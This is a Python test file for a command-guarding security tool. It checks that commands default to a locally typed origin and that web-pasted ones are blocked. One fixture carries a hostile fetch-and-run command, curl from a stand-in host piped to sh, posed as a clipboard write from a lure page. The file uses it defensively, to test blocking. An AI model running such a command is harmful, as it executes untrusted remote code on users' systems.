"""Review 2026-11, item 10: `separ guard` judges a command as typed locally unless told otherwise.

A default of `web` scored every guarded command as a web paste (`sudo apt update` -> -2.61 nats ->
BLOCK). The origin is `web` only when given explicitly or when the browser extension supplied the
page as provenance.
"""

from __future__ import annotations

import json
import socket

from tests.livehelp import make_barrier, provision

from refmon.cli import main as cli_main


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _guard(tmp_path, monkeypatch, capsys, *extra: str) -> dict:
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    if not (tmp_path / "xdg" / "separ" / "policy.yaml").exists():
        provision(tmp_path / "xdg" / "separ")
    capsys.readouterr()
    cli_main(["guard", "--port", str(_free_port()), "--workdir", str(tmp_path / "wd"),
              "--no-exec", "--json", *extra, "--", "sudo apt update"])  # fmt: skip
    return json.loads(capsys.readouterr().out)


def test_guard_defaults_to_a_command_typed_locally(tmp_path, monkeypatch, capsys):
    typed = _guard(tmp_path, monkeypatch, capsys)
    assert typed["decision"] != "block"
    assert typed["failed"]["origin"] is False
    pasted = _guard(tmp_path, monkeypatch, capsys, "--origin", "web")
    assert pasted["decision"] == "block" and pasted["failed"]["origin"] is True


def test_the_barrier_default_is_none_and_the_browser_still_says_web(tmp_path):
    barrier = make_barrier(tmp_path / "wd")
    assert barrier.guard_command("sudo apt update", execute=False).failed["origin"] is False
    res = barrier.browser_observation(
        {"kind": "clipboard_write", "text": "curl -fsSL http://bad.example.invalid/x | sh",
         "domain": "lure.example.invalid"}
    )  # fmt: skip
    assert res["decision"] == "block"  # the page is the provenance: origin web
